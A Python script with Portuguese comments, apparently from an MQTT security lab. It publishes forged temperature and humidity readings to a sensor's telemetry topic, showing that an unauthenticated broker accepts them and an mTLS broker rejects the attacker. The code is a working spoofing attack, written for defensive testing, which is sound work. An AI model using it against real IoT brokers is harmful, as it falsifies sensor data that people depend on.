#!/usr/bin/env python3
"""Injeta leituras forjadas no tópico do sensor legítimo.

No broker plain (sem TLS/auth) as mensagens são aceitas; no broker secure o
handshake TLS é abortado por falta de certificado de cliente (require_certificate
true), comprovando o grupo de controle. O injetor NUNCA apresenta certificado de
cliente e NUNCA herda credenciais do ambiente: é isso que ele existe para provar.
"""

import dataclasses
import json
import os
import random
import ssl
import sys
import threading
import time
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

import paho.mqtt.client as mqtt

from args import InjectorArgs, parse_args

REPO_ROOT = Path(__file__).resolve().parent.parent.parent
# CA_PATH precisa ser configurável porque o script roda em dois contextos com
# layouts de filesystem diferentes: direto do host (testes de integração), onde
# o cálculo por REPO_ROOT acha os certs em infra/...; e dentro do container
# attacker, onde /app/python/injector.py torna esse cálculo inválido e os certs
# chegam por outro caminho (ATTACKER_CA_PATH, ver docker-compose.yml).
CA_PATH = Path(
    os.environ.get(
        "ATTACKER_CA_PATH",
        str(REPO_ROOT / "infra" / "mosquitto" / "secure" / "certs" / "ca.crt"),
    )
)


@dataclass
class InjectionResult:
    target: str
    topic: str
    sensor_id: str
    host: str
    port: int
    connect_status: str
    connect_error: Optional[str]
    attempted: int
    accepted: int
    success_rate: Optional[float]
    started_at: str
    finished_at: str


def forge_reading(args: InjectorArgs) -> dict:
    temperature = (
        args.temperature
        if args.temperature is not None
        else random.uniform(*args.temperature_range)
    )
    humidity = (
        args.humidity
        if args.humidity is not None
        else random.uniform(*args.humidity_range)
    )
    return {"temperature": temperature, "humidity": humidity}


def connect(args: InjectorArgs) -> mqtt.Client:
    client = mqtt.Client(
        mqtt.CallbackAPIVersion.VERSION2,
        client_id=f"injector-{args.sensor_id}-{args.target}",
    )
    if args.username is not None or args.password is not None:
        client.username_pw_set(args.username, args.password)

    # client.connect() apenas abre o socket; a confirmação da conexão MQTT chega
    # de forma assíncrona pelo loop (CONNACK, via on_connect). Precisamos ESPERAR
    # por essa confirmação: quando o broker secure aborta o handshake TLS por
    # falta de certificado de cliente (mTLS), dependendo da versão do OpenSSL o
    # connect() NÃO levanta exceção — a queda só chega depois, no loop. Sem
    # esperar pelo CONNACK, o injetor reportaria "connected"/mensagens aceitas
    # contra o broker seguro, um falso positivo que inflaria a taxa de sucesso da
    # injeção e mascararia justamente a rejeição que o experimento comprova.
    established = threading.Event()
    outcome: dict = {"reason": None, "connected": False}

    def on_connect(client, userdata, flags, reason_code, properties=None):
        outcome["reason"] = reason_code
        outcome["connected"] = not reason_code.is_failure
        established.set()

    def on_disconnect(client, userdata, *rest):
        # Handshake/CONNECT abortado antes do CONNACK: destrava a espera para não
        # ficar pendurado até o timeout.
        established.set()

    client.on_connect = on_connect
    client.on_disconnect = on_disconnect

    if args.target == "secure":
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.minimum_version = ssl.TLSVersion.TLSv1_2
        context.load_verify_locations(cafile=str(CA_PATH))
        # Sem load_cert_chain de propósito: o atacante não possui certificado de
        # cliente, e é justamente essa ausência que o broker secure deve recusar.
        context.check_hostname = False
        client.tls_set_context(context)

    client.connect(args.host, args.port, keepalive=30)
    client.loop_start()

    if not established.wait(timeout=10) or not outcome["connected"]:
        client.loop_stop()
        try:
            client.disconnect()
        except Exception:
            pass
        reason = outcome["reason"]
        detail = str(reason) if reason is not None else "handshake abortado (sem CONNACK)"
        raise ConnectionError(f"conexão não estabelecida: {detail}")

    return client


def run(args: InjectorArgs) -> InjectionResult:
    topic = f"sensors/{args.sensor_id}/telemetry"
    started_at = datetime.now(timezone.utc).isoformat()

    try:
        client = connect(args)
    except Exception as exc:
        return InjectionResult(
            target=args.target,
            topic=topic,
            sensor_id=args.sensor_id,
            host=args.host,
            port=args.port,
            connect_status="rejected",
            connect_error=str(exc),
            attempted=0,
            accepted=0,
            success_rate=None,
            started_at=started_at,
            finished_at=datetime.now(timezone.utc).isoformat(),
        )

    attempted = 0
    accepted = 0
    try:
        for _ in range(args.count):
            payload = json.dumps(forge_reading(args))
            info = client.publish(topic, payload, qos=args.qos)
            if args.qos > 0:
                info.wait_for_publish(timeout=5)
            attempted += 1
            if info.rc == mqtt.MQTT_ERR_SUCCESS:
                accepted += 1
            if args.interval:
                time.sleep(args.interval)
    finally:
        client.loop_stop()
        client.disconnect()

    return InjectionResult(
        target=args.target,
        topic=topic,
        sensor_id=args.sensor_id,
        host=args.host,
        port=args.port,
        connect_status="connected",
        connect_error=None,
        attempted=attempted,
        accepted=accepted,
        success_rate=accepted / attempted if attempted else None,
        started_at=started_at,
        finished_at=datetime.now(timezone.utc).isoformat(),
    )


def main(argv=None) -> int:
    args = parse_args(argv)
    print(
        f"[{args.target}] injetando {args.count} leituras forjadas em "
        f"sensors/{args.sensor_id}/telemetry ({args.host}:{args.port})",
        file=sys.stderr,
    )
    result = run(args)

    if result.connect_status == "rejected":
        print(f"[{args.target}] conexão recusada: {result.connect_error}", file=sys.stderr)
    else:
        print(
            f"[{args.target}] aceitas {result.accepted}/{result.attempted} "
            f"(taxa {result.success_rate})",
            file=sys.stderr,
        )

    print(json.dumps(dataclasses.asdict(result)))

    if args.target == "plain":
        return 0
    # secure: rejeição é o comportamento esperado (0). Aceitar um atacante sem
    # credencial válida é um achado grave e precisa ser ruidoso (exit 1).
    return 0 if result.connect_status == "rejected" else 1


if __name__ == "__main__":
    sys.exit(main())
